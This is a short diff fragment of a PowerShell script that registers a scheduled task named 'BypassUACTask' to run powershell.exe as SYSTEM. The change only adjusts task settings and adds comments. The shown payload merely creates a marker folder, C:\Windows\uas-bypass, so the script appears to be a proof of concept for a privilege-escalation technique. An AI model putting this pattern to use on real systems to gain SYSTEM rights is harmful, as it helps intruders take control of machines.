@@ -7,8 +7,9 @@ if (([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match "S
     $taskAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-Command {mkdir C:\Windows\uas-bypass}"
     $taskTrigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddSeconds(10)  # Run after 10 seconds
     $taskPrincipal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount
-    $taskSettings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteriesAreCriticallyLow $true -DontStopIfGoingOnBatteries $true
-
+    $taskSettings = New-ScheduledTaskSettingsSet -DontStopIfGoingOnBatteries $true  # Adjusted settings
+    
+    # Register the scheduled task
     Register-ScheduledTask -Action $taskAction -Principal $taskPrincipal -Trigger $taskTrigger -Settings $taskSettings -TaskName "BypassUACTask"
 
     # Run the task immediately
